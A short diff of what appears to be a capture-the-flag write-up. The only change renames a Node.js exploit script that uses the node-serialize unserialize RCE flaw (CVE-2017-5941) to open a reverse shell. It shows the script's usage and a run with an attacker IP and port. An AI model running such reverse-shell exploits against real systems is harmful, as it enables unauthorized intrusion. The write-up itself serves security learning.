@@ -132,7 +132,7 @@ ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 ```
 
-### `rce-serialize.js`
+### `unserialize_rce.js`
 
 This script is used to obtain a reverse shell on the machine because it uses `unserialize` method from `node-serialize`. This Node.js module is known to have a Remote Code Execution (RCE) vulnerability (more information at [snyk.io](https://security.snyk.io/vuln/npm:node-serialize:20170208), CVE-2017-5941).
 
@@ -153,7 +153,7 @@ const [lhost, lport] = process.argv.slice(2, 4)
 
 const main = async () => {
   if (!lhost || !lport) {
-    console.log('[!] Usage: node serialize-rce.js <lhost> <lport>')
+    console.log('[!] Usage: node unserialize_rce.js <lhost> <lport>')
     process.exit()
   }
 
@@ -220,7 +220,7 @@ Using `nc` on another terminal, we get access to the machine:
 ```console
 $ npm install
 
-$ node serialize-rce.js 10.10.17.44 4444
+$ node unserialize_rce.js 10.10.17.44 4444
 [+] Login successful
 [+] RCE completed
 ```
